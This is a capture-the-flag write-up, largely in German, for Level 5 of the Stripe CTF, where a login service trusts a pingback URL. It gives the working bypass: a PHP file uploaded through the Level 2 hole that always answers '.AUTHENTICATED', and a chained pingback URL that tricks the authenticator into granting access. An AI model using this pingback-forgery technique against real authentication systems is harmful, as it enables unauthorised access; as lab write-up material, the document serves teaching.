LEVEL 05
========

User: .AUTHENTICATED

Open ?pingback=https://level02-2.stripe-ctf.com/user-nzqlfdsupg/uploads/test.php

----

Many attempts have been made at creating a federated identity system for the web (see OpenID, for example). However, none of them have been successful. Until today.

The DomainAuthenticator is based off a novel protocol for establishing identities. To authenticate to a site, you simply provide it username, password, and pingback URL. The site posts your credentials to the pingback URL, which returns either "AUTHENTICATED" or "DENIED". If "AUTHENTICATED", the site considers you signed in as a user for the pingback domain.

You can check out the Stripe CTF DomainAuthenticator instance here: https://level05-1.stripe-ctf.com/user-XXXX. We've been using it to distribute the password to access Level 6. If you could only somehow authenticate as a user of a level05 machine...

To avoid nefarious exploits, the machine hosting the DomainAuthenticator has very locked down network access. It can only make outbound requests to other stripe-ctf.com servers. Though, you've heard that someone forgot to internally firewall off the high ports from the Level 2 server.

Interesting in setting up your own DomainAuthenticator? You can grab the source from git clone https://level05-1.stripe-ctf.com/user-XXXX/level05-code, or by reading on below.

---

Level 05 ist ein Authorisierungsscript, dass von einem externen Pingback gesagt bekommt, ob der User nun valide ist oder nicht. Wir erinnern uns an Level 2 und packen dort das furchtbar kurze Script drauf:

    <?php
      echo "\n.AUTHENTICATED\n";
    ?>

Der User wird also mit dem Link zu diesem Script immer autorisiert - jedoch nicht auf dem korrekten Server! Um das dann wiederum zu erreichen geben wir als Pingback folgenden Link ein:

    https://level05-1.stripe-ctf.com/user-XXXX/?pingback=https://level02-2.stripe-ctf.com/user-XXXX/uploads/test.php

(hier natürlich eure Server/Usernames anpassen)
Als Nutzername tragen wir .AUTHENTICATED ein - das Script läuft jetzt ein mal im Kreis und autorisiert euch auf dem richtigen Server.